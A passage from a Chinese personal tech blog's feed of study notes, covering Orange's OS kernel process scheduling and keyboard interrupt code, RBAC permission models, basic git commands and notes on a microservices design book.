start="5"><li>修改中断处理程序</li></ol><ul><li>进程从“睡眠”状态到“运行”状态既是将esp指向进程表项的开始处，因此想要恢复不同的进程，只需要将esp指向不同的进程表即可</li></ul></li></ul><p>双进程图：<br><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_4_1.jpg" alt></p><ul><li>添加一个进程的步骤总结<ul><li><ol start="0"><li>添加一个进程体</li></ol></li><li><ol><li>在task_table中增加一项(global.c)</li></ol></li><li><ol start="2"><li>让NR_TASKS加1</li></ol></li><li><ol start="3"><li>定义任务堆栈</li></ol></li><li><ol start="4"><li>修改STACK_SIZE_TOTAL(proc.h)</li></ol></li><li><ol start="5"><li>添加新进程执行体的函数声明(proto.h)<br><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_4_2.jpg" alt></li></ol></li></ul></li></ul><h3 id="%E7%9B%AE%E5%89%8Dorange%E2%80%99s%E8%BF%90%E8%BD%AC%E8%BF%87%E7%A8%8B" tabindex="-1">目前orange’s运转过程</h3><p><img src="/images/%E6%9C%AC%E7%A7%91//OS%E5%AE%9E%E9%AA%8C/%E6%A9%98%E5%AD%90%E8%BF%90%E8%BD%AC%E8%BF%87%E7%A8%8B.jpg" alt></p><h3 id="6.5-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" tabindex="-1">6.5 系统调用</h3><ul><li>系统调用（System Call）是<strong>操作系统提供给应用程序访问其功能和服务的一种接口</strong>。应用程序可以通过系统调用向操作系统请求执行特权操作，例如文件读写、网络通信、进程管理等。系统调用允许应用程序在用户态（User Mode）与内核态（Kernel Mode）之间进行切换，以便使用操作系统提供的特权功能。</li><li>通过系统调用，应用程序可以利用操作系统的功能来完成一些只有操作系统才能执行的任务，例如访问底层硬件设备、进行进程间通信、分配内存等。系统调用提供了一种安全和受控的方式，使应用程序能够利用操作系统的特权功能，同时保护操作系统免受不当访问和恶意行为的影响。</li><li>不同的操作系统具有不同的系统调用接口和调用约定。通常，应用程序需要使用特定的系统调用指令或函数来触发系统调用，并传递参数和获取返回值。操作系统会在接收到系统调用请求时，验证请求的合法性，并执行相应的操作，然后将结果返回给应用程序。</li><li>系统调用是操作系统的核心组成部分，它提供了应用程序与操作系统之间的交互接口，使应用程序能够利用操作系统的功能和服务来实现各种任务。</li></ul><h4 id="1-%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8" tabindex="-1">1 实现一个简单的系统调用</h4><ul><li>int get_ticks()统计当前总共发生了多少次时钟中断</li><li>更改TestA，使其打印当前ticks<br><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_5_1.jpg" alt><br>可以看到第一次打印出A0x0,第二次打印出A0x3，而两次打印之间的#共有三个，所以该系统调用函数一切正常</li></ul><h4 id="2-get_ticks()%E7%9A%84%E5%BA%94%E7%94%A8" tabindex="-1">2 get_ticks()的应用</h4><p>通过该函数可以写一个判断时间的函数，用来替代丑陋的delay()函数</p><ol><li>8253/8254 PIT<br>中断是由一个被称作PIT(Programmable Interval Timer)的芯片触发的.</li><li>不太精确的延迟函数，使用该函数替代原先的delay函数，delay函数之前是纯纯for循环</li></ol><pre><code class="language-c">PUBLIC void milli_delay(int milli_sec)&#123;    int t=get_ticks();    while(((get_ticks()-t)*1000/HZ)&lt;milli_sec)&#123;&#125;    //通过时间中断次数写延迟函数，比野蛮循环好，但精度不高&#125; </code></pre><h3 id="6.6-%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6" tabindex="-1">6.6 进程调度</h3><ol><li>避免堆成–进程的节奏性<br>将三个进程的延迟时间不同，而延迟的时间越长，干活时间越少，这与优先级的概念相吻合。<br>因此我们可以通过ticks使用时间片轮转算法，及时间片的不同大小对进程进行优先级的确立和调度<br>即使用6.5中的系统调用函数，通过设置不同的延迟时长，即可改变各进程的时间片大小</li></ol><pre><code class="language-c">void TestA()&#123;  ****  milli_delay(300);  ****&#125;void TestB()&#123;  ****  milli_delay(900);  ****&#125;void TestA()&#123;  ****  milli_delay(1500);  ****&#125;</code></pre><p><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_6_1.jpg" alt><br>可以看出A,B进程运行次数比约为3：1；A，C进程运行次数比约为5：1.</p><ul><li><p>如果将延迟的过程拿到进程调度模块中实现，就可以实现进程的优先级，目前的调度算法可以算是时间片流转算法</p></li><li><p>新的进程调度算法（时间片流转算法）：</p><ul><li>在进程表中添加两个成员：ticks是递减的，从某个初值到0。定义另一个变量priority，其恒定不变，当所有的进程ticks都变成0时，再将各自的ticks赋值为priority，然后继续执行。</li><li>同时，将所有进程的延迟时间全改为相同的值</li><li>限制当一个进程的ticks用完之前，其它进程不能获得机会运行</li><li>本次实验中，设置进程A,B,C的priority分别为150,50,30<br><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/6_6_2.jpg" alt></li><li>可以看出图片中打印字符数目比值接近15:5:3</li></ul></li></ul><ol><li>优先级调度总结<br>minix中，进程分为任务，服务，用户进程三种，为此设置了3个不同的优先队列，这里仅以get_ticks进入进程调度算法领域的大门</li></ol><h2 id="%E7%AC%AC%E4%B8%83%E7%AB%A0-%E8%BE%93%E5%85%A5%2F%E8%BE%93%E5%87%BA%E7%B3%BB%E7%BB%9F" tabindex="-1">第七章 输入/输出系统</h2><h3 id="7.1-%E9%94%AE%E7%9B%98" tabindex="-1">7.1 键盘</h3><h4 id="1-%E9%94%AE%E7%9B%98%E4%B8%AD%E6%96%AD" tabindex="-1">1 键盘中断</h4><ul><li>新建一个文件keyboard.c，添加一个简单的键盘中断程序。<ul><li>结果是每次按一次键，打印一个星号。</li><li>同时为了不受其他进程输出的影响，我们把其它进程的输出注释掉</li><li>然而makefile后，出现一个星号就不再响应，看来事情还较为复杂</li></ul></li></ul><h4 id="2-at%2Cps%2F2%E9%94%AE%E7%9B%98" tabindex="-1">2 AT,PS/2键盘</h4><p>AT键盘（又称为PC/AT键盘）是早期PC机使用的键盘接口标准。它使用5针DIN连接器，并且是较早版本的键盘接口。</p><p>PS/2键盘是后来引入的键盘接口标准，用于连接键盘到计算机。它使用6针Mini-DIN连接器，比AT键盘接口更小巧。</p><p>两种键盘接口在物理连接上有所不同，因此AT键盘不能直接连接到PS/2接口，反之亦然。然而，通过使用适配器，可以将AT键盘连接到PS/2接口，或将PS/2键盘连接到AT接口。</p><p>需要注意的是，随着技术的进步，USB接口逐渐取代了AT和PS/2键盘接口，成为现代计算机键盘的主要标准。</p><h4 id="3-%E9%94%AE%E7%9B%98%E6%95%B2%E5%87%BB%E7%9A%84%E8%BF%87%E7%A8%8B" tabindex="-1">3 键盘敲击的过程</h4><ul><li><p>键盘敲击的过程：键盘敲击有两个方面的含义</p><ul><li>动作：<ul><li>按下</li><li>保持按住的状态</li><li>放开</li></ul></li><li>内容：键盘上不同的键，字母键还是数字键等</li></ul></li><li><p>敲击键盘所产生的编码被称作扫描码(Scan Code),分为Make Code和Break Code</p><ul><li>Make Code ：当一个键被按下或保持住按下时产生</li><li>Break Code：当键弹起时</li><li>除Pause键外，每个按键都对应一个Make Code和Break Code</li><li>扫描码总过有三套，Scan code set 1/2/3</li></ul></li><li><p>过程：</p><ul><li>当8048检测到一个键的动作后，会把相应的扫描码发送给8042，8042会把它转换成相应的Scan code set 1的扫描码，并将其放置在输入缓冲区中，然后8042告诉8259A产生中断，此时如果键盘又有新的键被按下，8042将不再接受，一直到缓冲区被清空，8042才能接受更多的扫描码</li><li>因此只有把扫描码从缓冲区中读出来后，8042才能继续响应新的按键</li></ul></li><li><p>修改程序</p><ul><li>在键盘中断中加入<code>in_byte(0x60)</code>，此时按一下键出现两个星号，每次按键产生一个Make Code和一个Break Code</li><li>进一步修改键盘中断,此时键盘按下“a”，“9”可以看到前4组代码0x1E,0x9E,0xA,0x8A，实际这就是“a”“9”的Make Code和Break Code<br><img src="../../images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/7_1_3.jpg" alt></li></ul></li></ul><pre><code class="language-c">PUBLIC void keyboard_handler(int irq)&#123;  u8 scan_code = in_byte(0x60);  disp_int(scan_code);&#125;</code></pre><h4 id="4-%E7%94%A8%E6%95%B0%E7%BB%84%E8%A1%A8%E7%A4%BA%E6%89%AB%E6%8F%8F%E7%A0%81" tabindex="-1">4 用数组表示扫描码</h4><ul><li><p>用数组表示扫描码</p><ul><li>建立一个数组，以扫描码为下标，对应的元素就是对应字符</li></ul></li><li><p>新的问题及解决</p><ul><li>8042的输入缓冲区大小只有一个字节</li></ul></li></ul><h4 id="5-%E9%94%AE%E7%9B%98%E8%BE%93%E5%85%A5%E7%BC%93%E5%86%B2%E5%8C%BA" tabindex="-1">5 键盘输入缓冲区</h4><ul><li>因此需要实现一个缓冲区，放置中断例程中受到的扫描码</li><li>代码很简单，如果缓冲区已满，则直接将收到的字节丢弃</li></ul><pre><code class="language-c">PUBLIC void keyboard_handler(int irq)&#123;  u8 scan_code = in_byte(KB_DATA);  if (kb_in.count &lt; KB_IN_BYTES)&#123;    *(kb_in.p_head)=scan_code;    kb_in.p_head++;    if(kb_in.p_head==kb_in.buf + KB_IN_BYTES)&#123;      kb_in.p_head=kb_in.buf;    &#125;    kb_in.count++;  &#125;&#125;</code></pre><h4 id="6-%E6%96%B0%E5%8A%A0%E4%BB%BB%E5%8A%A1%E5%A4%84%E7%90%86%E9%94%AE%E7%9B%98%E6%93%8D%E4%BD%9C" tabindex="-1">6 新加任务处理键盘操作</h4><h4 id="7-%E8%A7%A3%E6%9E%90%E6%89%AB%E6%8F%8F%E7%A0%81" tabindex="-1">7 解析扫描码</h4><ul><li><p>解析扫描码的复杂性</p><ul><li>不但分为 Make Code ，Break Code</li><li>且有长有短，功能多样，如Home键对应一种功能而不是ASCII码</li></ul></li><li><p>思路：由简至繁，最终可以显示大部分字母，并对一些功能按键不做反应</p></li></ul><p><img src="/images/%E6%9C%AC%E7%A7%91/OS%E5%AE%9E%E9%AA%8C/7_1_7.jpg" alt></p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RBAC模型学习</title>
      <link href="/2023/08/16/%E5%B7%A5%E5%85%B7/RBAC/"/>
      <url>/2023/08/16/%E5%B7%A5%E5%85%B7/RBAC/</url>
      
        <content type="html"><![CDATA[<h2 id="0-rbac-%E5%92%8C-abac" tabindex="-1">0 RBAC 和 ABAC</h2><ul><li><p>RBAC：Role-Based Access Control 基于角色的访问控制</p></li><li><p>ABAC：Attribute-Based Access Control 基于属性的访问控制</p></li><li><p>美国国家标准与技术研究院为RBAC分了4级，为RBAC0-3</p></li></ul><h2 id="1-rbca%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5" tabindex="-1">1 RBCA基础概念</h2><ul><li><p>RBAC：Role-Based Access Control，基于角色的访问控制。</p></li><li><p>通过引入 角色 这一概念，将用户和权限解耦，来满足权限的批量管理。</p></li><li><p>实现最简单的RBAC系统(也就是RBAC0)一共需要五张表：三张信息表和两张关系表。</p><ul><li>三张信息表：用户信息表、角色信息表和权限信息表</li><li>两张关系表：用户-角色关系表、角色-权限关系表</li></ul></li><li><p>模型操作</p><ul><li>授权：通过给用户分配不同的角色，来改变其拥有的权限。<ul><li>例子：管理员应用增删改查四种权限，访问者只有查的权限，对于新增用户老李，直接授予去管理者或者访问者角色，获得对应的权限</li><li>RBAC中只需在用户-角色关系表中增加一个数据即可</li></ul></li><li>鉴权：验证某个是否拥有某个权限<ul><li>过程：<ul><li><ol><li>传入用户和权限信息</li></ol></li><li><ol start="2"><li>根据用户-角色表获得该用户的所有角色</li></ol></li><li><ol start="3"><li>根据角色-权限表获得该用户拥有的所有权限</li></ol></li><li><ol start="4"><li>对比权限数据</li></ol></li></ul></li></ul></li><li>权限变更：收回或者增加权限<ul><li>操作：收回权限只需在角色-权限表中删除对应的一条数据即可，增加同理</li></ul></li></ul></li><li><p>RBAC0的缺点</p><ul><li><ol><li>在复杂的业务场景中，同一个角色在不同的情况下拥有不同的权限。</li></ol></li><li><ol start="2"><li>对于管理员或者超级管理员这类上层角色，拥有很多权限，每当出现一个权限，都要将权限绑定给他们，当这类管理角色增多时，RBAC0的模型成本会上升，这一问题在RBAC1中得到解决</li></ol></li><li><ol start="3"><li>角色爆炸时，RBAC模型难以维护，这是可以转为ABAC模型</li></ol></li></ul></li></ul><h2 id="2-rbac%E8%BF%9B%E9%98%B6" tabindex="-1">2 RBAC进阶</h2><h3 id="2.1-rbac1" tabindex="-1">2.1 RBAC1</h3><ul><li>动机举例：<ul><li>一个企业有老板，主管，员工等角色，则整体结构如下<img src="/images/%E5%B7%A5%E5%85%B7/RBAC/2_1_1.webp" alt></li><li>该结构中上级有下级的所有权限，不同的角色间有着重叠的权限，此时如果新增一条员工的权限，需要同时绑定给主管和老板，否则会出现员工有权限，老板没权限的情况</li><li>为此，RBAC1中引入了角色继承，在RBAC1中，角色之间有层级关系，上级角色默认拥有下级角色的全部权限，于是新的结构如下<img src="/images/%E5%B7%A5%E5%85%B7/RBAC/2_1_2.webp" alt></li><li>此时就不会出现下级角色拥有上级角色所没有的权限了，由于生活中的各种角色也具有类型的层级关系，因此，RBAC1是最常用的权限模型。</li></ul></li><li>模型结构：<img src="/images/%E5%B7%A5%E5%85%B7/RBAC/2_1_3.webp" alt></li><li>实现<ul><li>三张数据表：用户表、角色表、权限表。</li><li>三张关系表：用户-角色关系表、角色-继承关系表、角色-权限关系表。</li></ul></li><li>实现中的一个细节：角色-权限关系表有两种方案<ul><li><ol><li>仅记录与角色直接关联的权限。</li></ol><ul><li>优点：生效快，角色继承关系一旦生效，那么鉴权就能通过</li><li>缺点：鉴权时，需要先拿到用户的所有角色及其子角色(读扩散)，然后对比全部角色的全部权限点。在角色数量比较多的时候，会影响鉴权接口的响应时间。</li><li>优势场景：角色继承关系频繁变动的场景。</li></ul></li><li><ol start="2"><li>记录与角色直接关联的权限，且记录从子角色继承而来的权限。</li></ol><ul><li>优点：鉴权较快，不存在读扩散的问题。</li><li>缺点：每次角色继承关系变动的时候，都需要对上层角色进行大量的权限绑定与解绑操作(写扩散)。</li><li>优势场景：角色继承关系变化很少的场景。</li></ul></li></ul></li><li>两全其美的方法：我全都要<ul><li>使用两张角色权限关系表，一张仅记录直接关联的权限，一张记录全部权限。</li><li>鉴权时：优先查询全部权限关系表，若鉴权失败，则自动降级查询继承关系的鉴权模式。</li></ul></li></ul><h3 id="rbac2" tabindex="-1">RBAC2</h3><ul><li>静态职责分离（SSD）<ul><li>互斥角色：同一用户只能分配到一组互斥角色集合中至多一个角色，比如用户不能同时拥有会计和审计两个角色</li><li>基数约束：一个用户可拥有的角色数目受限；一个角色可被分配的用户数量受限；一个角色对应的权限数目受限</li><li>先决条件角色：用户想要成为上级角色，必须先成为下一级角色，比如游戏中的转职</li></ul></li><li>动态职责分离（DSD）<ul><li>允许一个用户具有多个角色，但在运行时只能激活其中某些角色，比如BOSS直聘，一个用户既可以是招聘者也可以是应聘者，但同时只能选择一种身份进行操作</li></ul></li></ul><h3 id="rbac3" tabindex="-1">RBAC3</h3><p>RBAC1 + RBAC2，既有角色继承，也有各种限制条件。</p><h2 id="3-rbac%E4%B8%AD%E7%9A%84%E7%94%A8%E6%88%B7%E5%88%92%E5%88%86" tabindex="-1">3 RBAC中的用户划分</h2><h3 id="3.1-%E7%94%A8%E6%88%B7%E7%BB%84" tabindex="-1">3.1 用户组</h3><ul><li>用户组是一群用户的组合，而角色是用户和权限之间的桥梁。<ul><li>用户组把相同属性的用户组合起来，比如同一个项目的开发、产品、测试可以是一个用户组，同一个部门的相同职位的员工可以是一个用户组， 一个用户组可以是一个职级，可以是一个部门，可以是一起做事情的来自不同岗位的人。</li></ul></li><li>用户可以分组，权限也可以分组，权限特别多的情况下，可以把一个模块的权限组合起来成为一个权限组，权限组也是解决权限和角色对应关系复杂的问题。</li></ul><p>此时RBAC模型为<img src="/images/%E5%B7%A5%E5%85%B7/RBAC/3_1_1.png" alt></p><h3 id="3.2-%E7%BB%84%E7%BB%87" tabindex="-1">3.2 组织</h3><ul><li>每个公司都有自己的组织架构，很多时候权限的分配可以根据组织架构来划分。统一组织内的人权限大都一样</li><li>按组织分配角色的优势<ul><li>实现权限分配的自动化： 和组织关系打通之后，按照组织来分配角色，如果有新入职的用户，被划分在某个组织下面之后，会自动获取该组织下所有的权限，无需人工分配。又比如有用户调岗，只需要把组织关系调整就可以了，权限会跟着组织关系自动调整，也无需人工干预。这么做首先需要把权限和组织关系打通。</li><li>控制数据权限： 把角色关联到组织，组织里的成员只能看到本组织下的数据，比如市场推广和大客定制，市场推广针对的是零散的客户，大可定制针对的是有一定体量的客户，相互的数据虽然在一个平台，但是只能看自己组织下的数据。</li></ul></li><li>加入组织后的模型图<img src="/images/%E5%B7%A5%E5%85%B7/RBAC/3_2_1.png" alt></li></ul><h3 id="3.3-%E8%81%8C%E4%BD%8D" tabindex="-1">3.3 职位</h3><p>一个组织下面会有很多职位，比如财务管理会有财务总监、财务主管、会计、出纳员等职位，每个职位需要的权限是不一样的，可以像组织那样根据职位来分配不同的角色，由于一个人的职位是固定的，所以用户跟职位的对应关系时一对一的关系，职位跟角色的对应关系可以是多对多的关系。</p><h2 id="4-%E7%90%86%E6%83%B3%E7%9A%84rbac%E6%A8%A1%E5%9E%8B" tabindex="-1">4 理想的RBAC模型</h2><p>把RBAC、RBAC1、RBAC2、用户组、组织、职位汇总起来的模型如下所示：<br><img src="/images/%E5%B7%A5%E5%85%B7/RBAC/4_1.png" alt></p><h2 id="5-%E6%9D%83%E9%99%90%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%A1%A8%E8%AE%BE%E8%AE%A1" tabindex="-1">5 权限系统的表设计</h2><h3 id="5.1-%E6%A0%87%E5%87%86rbac%E6%A8%A1%E5%9E%8B%E8%A1%A8%E8%AE%BE%E8%AE%A1" tabindex="-1">5.1 标准RBAC模型表设计</h3><p><img src="/images/%E5%B7%A5%E5%85%B7/RBAC/5_1.png" alt></p><h3 id="5.2-%E7%90%86%E6%83%B3rbac%E6%A8%A1%E5%9E%8B%E8%A1%A8%E8%AE%BE%E8%AE%A1" tabindex="-1">5.2 理想RBAC模型表设计</h3><p><img src="/images/%E5%B7%A5%E5%85%B7/RBAC/5_2.png" alt></p><h2 id="%E5%8F%82%E8%80%83" tabindex="-1">参考</h2><p><a href="https://zhuanlan.zhihu.com/p/511846624">权限系统设计之RBAC</a><br><a href="https://zhuanlan.zhihu.com/p/516533087">权限系统之RBAC进阶</a><br><a href="https://blog.csdn.net/u010482601/article/details/104989532">全网最全的权限系统设计方案，不接受反驳！</a></p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RBAC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>overleaf使用（Latex）</title>
      <link href="/2023/08/16/%E5%B7%A5%E5%85%B7/overleaf%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/08/16/%E5%B7%A5%E5%85%B7/overleaf%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>这个坑还是晚点再填吧，到时自己看书学学</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git学习</title>
      <link href="/2023/08/16/%E5%B7%A5%E5%85%B7/git%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/08/16/%E5%B7%A5%E5%85%B7/git%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://learngitbranching.js.org/?locale=zh_CN">连接</a></p><h2 id="%E5%9F%BA%E7%A1%80%E7%AF%87" tabindex="-1">基础篇</h2><ul><li><p><code>undo</code> 撤销一次更改</p></li><li><p><code>git commit</code><br>进行一次更改</p></li><li><p><code>git branch name</code><br>创建一个名为 name 的分支</p></li></ul><p>分支：可以理解为树分叉，每次选一个分叉进行开发</p><ul><li><p><code>git checkout name</code><br>切换到name的分支上</p></li><li><p><code>git checkout -b name</code><br>创建一个分支并转移到分支上</p></li><li><p><code>git merge name</code><br>将当前所在分支合并到name</p></li><li><p><code>git rebase name</code><br>将当前分支与name分支的另一种合并方法</p></li></ul><h2 id="%E9%AB%98%E7%BA%A7%E7%AF%87" tabindex="-1">高级篇</h2><p>head相当于当前指向位置</p><ul><li><p><code>git checkout hashval（绝对引用）</code><br>将head移动到对应hashval的节点上</p></li><li><p><code>git checkout name^</code> (相对应用)<br>表示将head指向name提交位置的父节点</p></li><li><p><code>git checkout name~x</code>（相对引用）<br>表示将head指向name提交位置后退x次的节点</p></li><li><p>使用相对引用最多的地方：移动分支<br><code>git branch -f main HEAD~3</code>表示将main分支强制指向HEAD的第三级父提交</p></li><li><p><code>git reset name ~x/^</code><br>改写历史，回到若干个节点前，已经改变的从未发生过，但仅对本地而言。<br>对于多人使用的远程分支是无效的。</p></li><li><p><code>git revert name ~x/^</code><br>前进一个节点，但新建的节点与回溯到的节点相同</p></li></ul><h2 id="%E8%BF%9B%E9%98%B6" tabindex="-1">进阶</h2><p>高级以上已经可应付90%，接下来是在复杂工作流中使用</p><ul><li><code>git cherry-pick &lt;提交号&gt;</code><br>将选择的提交号节点按顺序复制到当前head下</li><li><code>git rebase -i name ~x/^</code><br>将从HEAD当所选父节点的所有节点到可视化界面进行选择重排，复制到所选父节点下</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微服务设计</title>
      <link href="/2023/08/16/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1/"/>
      <url>/2023/08/16/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1/x-x.jpg" alt><br>[toc]<br>本文章为阅读这 微服务设计[美]Sam Newman 一书籍的读书笔记</p><h2 id="%E7%AC%AC1%E7%AB%A0-%E5%BE%AE%E6%9C%8D%E5%8A%A1" tabindex="-1">第1章 微服务</h2><h3 id="1.1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%BE%AE%E6%9C%8D%E5%8A%A1" tabindex="-1">1.1 什么是微服务</h3><p>微服务就是一些协同工作的小而自治的服务</p><h4 id="1.1.1-%E5%BE%88%E5%B0%8F%EF%BC%8C%E4%B8%93%E6%B3%A8%E4%BA%8E%E5%81%9A%E5%A5%BD%E4%B8%80%E4%BB%B6%E4%BA%8B" tabindex="-1">1.1.1 很小，专注于做好一件事</h4><ul><li><p>单一职责原则：把因相同原因而变化的东西聚合在一起，把因不同原因而变化的东西分离开来（Robert C.Martin）</p><ul><li>在代码层面：代码的内聚性</li><li>在服务层面：微服务</li></ul></li><li><p>服务越小，微服务架构的优点和缺点也越明显</p><ul><li>服务越小，带来的独立性的好处多但管理大量服务也会越复杂</li></ul></li></ul><h4 id="1.1.2-%E8%87%AA%E6%B2%BB%E6%80%A7" tabindex="-1">1.1.2 自治性</h4><ul><li>一个微服务就是一个独立的实体。它可以独立地部署在PAAS上，也可以作为一个操作系统进程存在。</li><li>但我们应该尽量避免把多个服务部署到同一个机器上，尽管这种隔离性会引发一些代价，但它能够大大简化分布式系统的构建</li><li>服务之间均通过网络调用进行通信，从而加强服务之间的隔离性，避免紧耦合</li><li>服务会暴露出API（Application Programming Interface 应用编程接口），然后服务之间通过这些API进行通信。API的实现技术应该避免和消费方耦合。</li><li>为了达到解耦的目的，需要正确地建模服务和API</li></ul><h3 id="1.2-%E4%B8%BB%E8%A6%81%E5%A5%BD%E5%A4%84" tabindex="-1">1.2 主要好处</h3><h4 id="1.2.1-%E6%8A%80%E6%9C%AF%E5%BC%82%E6%9E%84%E5%9E%8B" tabindex="-1">1.2.1 技术异构型</h4><ul><li><p>在多服务协作的系统中，可以在不同的服务中使用最适合该服务的技术，尝试使用一种适用所有场景的标准化技术，会使所有场景都得不到好的支持</p><ul><li>例如：不同服务可以使用不同的数据库<img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1/1-1.jpg" alt></li></ul></li><li><p>微服务可以帮助我们更快地采用新技术，并且理解到新技术地好处</p></li><li><p>为了同时使用多种技术，会付出代价，比如一些组织会限制语言的选择，比如网飞和推特地技术基于JVM</p></li><li><p>贯穿本书地一个问题：微服务如何寻找平衡</p><ul><li>第2章将会讨论如何做技术选择，其中主要专注于演进式架构</li><li>第4章主要关注继承，将讨论如何避免服务间的过度耦合，从而可以彼此独立地进行技术演化</li></ul></li></ul><h4 id="1.2.2-%E5%BC%B9%E6%80%A7" tabindex="-1">1.2.2 弹性</h4><ul><li>在单块服务系统中，如果服务不可用，那么所有功能不可用。<ul><li>可以通过将同样的实例运行到不同地机器上来降低功能完全不可用的概率</li></ul></li><li>然而微服务系统本身就能很好地处理服务的不可用和功能降级问题</li></ul><h4 id="1.2.3-%E6%89%A9%E5%B1%95" tabindex="-1">1.2.3 扩展</h4><ul><li>庞大的单体服务，即便只有一小部分存在性能问题，也需要对整个服务进行扩展，如果使用较小的多个服务，则可以只对需要扩展的服务进行扩展</li></ul><h4 id="1.2.4-%E7%AE%80%E5%8C%96%E9%83%A8%E7%BD%B2" tabindex="-1">1.2.4 简化部署</h4><ul><li>单体服务中，部署频率低，意味着两次发布之间软件有很多的功能增强，此时两次发布之间的差异越大，出错的机率越高</li><li>微服务架构中，各个服务的部署是独立的，可以针对特定服务进行单个部署。如果真出了问题，只影响一个服务，且容易回滚</li></ul><h4 id="1.2.5-%E4%B8%8E%E7%BB%84%E7%BB%87%E6%9E%B6%E6%9E%84%E7%9B%B8%E5%8C%B9%E9%85%8D" tabindex="-1">1.2.5 与组织架构相匹配</h4><ul><li>微服务架构可以很好地将架构和组织架构相匹配，避免出现过大地代码库，从而获得理想的团队大小和生产力，服务的所有权也更好地可以在团队之间迁移，从而避免异地团队地出现。</li></ul><h4 id="1.2.6-%E5%8F%AF%E7%BB%84%E5%90%88%E6%80%A7" tabindex="-1">1.2.6 可组合性</h4><ul><li>在微服务架构中，根据不同的目的，人们可以通过不同的方式使用同一个功能，在考虑用户如何使用该软件时这一点尤为重要。</li><li>单纯考虑桌面网站或移动应用程序的时代已经过去了，现在需要考虑的程序种类有 Web，原生应用，移动端Web，平板应用以及可穿戴设备等</li><li>因此针对每一种程序都需要考虑已有功能组合来实现这些应用</li><li>在微服务架构中，系统会提供很多接缝供外部使用，当情况发生变化时，可以使用不同的方式构建应用，而整体化应用程序只能提供一个非常粗粒度的接缝供外部使用</li></ul><h4 id="1.2.7-%E5%AF%B9%E5%8F%AF%E6%9B%BF%E4%BB%A3%E6%80%A7%E7%9A%84%E4%BC%98%E5%8C%96" tabindex="-1">1.2.7 对可替代性的优化</h4><ul><li>历史遗留系统，可能使用Fortran变体编写，且运行在几十年前就应该被淘汰的硬件上，但以为工作量大，而且风险很高，至今仍在运行</li><li>而在微服务架构中，可以轻易地重写服务或删除不再使用的服务</li></ul><h3 id="1.3-%E9%9D%A2%E5%90%91%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%9E%B6%E6%9E%84" tabindex="-1">1.3 面向服务的架构</h3><ul><li><p>SOA（Service-Oriented Architecture，面向服务的架构）是一种设计方法，其中包含多个服务，而服务之间通过配合最终会提供一系列功能。</p></li><li><p>一个服务通常以独立的形式存在于操作系统进程中，服务之间通过网络调用，而非采用进程内调用的方式进行通信</p></li><li><p>实施SOA时会遇到很多问题</p><ul><li>通讯协议(如SOAP)如何选择</li><li>第三方中间件如何选择</li><li>服务粒度如何确定</li></ul></li><li><p>就像认为XP或者Scrum是敏捷软件开发的一种方法一样，微服务架构也可以是SOA的一种特定方式</p></li></ul><h3 id="1.4-%E5%85%B6%E4%BB%96%E5%88%86%E8%A7%A3%E6%8A%80%E6%9C%AF" tabindex="-1">1.4 其他分解技术</h3><ul><li>基于微服务架构主要有两个优势<ul><li><ol><li>具有较小的粒度</li></ol></li><li><ol start="2"><li>能够在解决问题的方法上给予你更多的选择</li></ol></li></ul></li></ul><h4 id="1.4.1-%E5%85%B1%E4%BA%AB%E5%BA%93%E6%8A%80%E6%9C%AF" tabindex="-1">1.4.1 